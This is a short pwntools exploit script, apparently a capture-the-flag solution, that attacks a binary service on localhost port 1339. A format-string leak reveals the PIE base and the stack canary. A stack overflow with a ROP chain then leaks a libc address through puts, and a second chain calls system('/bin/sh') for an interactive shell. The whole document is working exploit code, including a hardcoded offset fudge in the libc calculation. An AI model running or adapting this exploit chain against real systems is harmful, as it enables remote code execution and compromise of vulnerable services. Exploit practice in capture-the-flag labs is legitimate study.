from pwn import *
#context.log_level = 'DEBUG'
context.binary = elf = ELF('./dist.o')
#p = process('./test.o')
p = remote("127.0.0.1",1339)
rop = ROP(elf)
libc = ELF('libc6_2.30-0ubuntu2.2_amd64.so')

p.recvuntil("huh...")
p.sendline("%34$p\n%39$p\n") #from fuzz.py
p.recvuntil("Meh\n")

pie = int(p.recvuntil("\n"), 16) - 0xc7c
canary = int(p.recvuntil("\n"),16)

print(hex(pie))
print(hex(canary))

payload = b"A"*264+p64(canary)+b"A"*8

puts = elf.plt['puts'] + pie
main = elf.symbols['main'] + pie
pop = (rop.find_gadget(['pop rdi', 'ret']))[0] + pie
put_got = elf.got['puts'] + pie
ret = (rop.find_gadget(['ret']))[0] + pie

payload += p64(pop) + p64(put_got) + p64(puts) +p64(main)
print(p.clean())
p.sendline(payload)
p.recvuntil(b"A"*264) #ignore this chunk of nonsense
recieved = p.recv(8)
leek = u64(recieved.ljust(8, b"\x00"))
print("Leaked libc address   " + hex(leek))
base = leek - libc.symbols["puts"] - 0x770a000000000000 #gdb thingz to match PIE
libc.address = base
print("libc base     " + hex(base))
p.recvuntil("huh...")
shell = b"A"*264 + p64(canary)+b"A"*8 + p64(ret) + p64(pop) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym['system'])
p.clean()
p.sendline("hehh\n")
p.sendline(shell)
print(p.clean())
p.interactive()
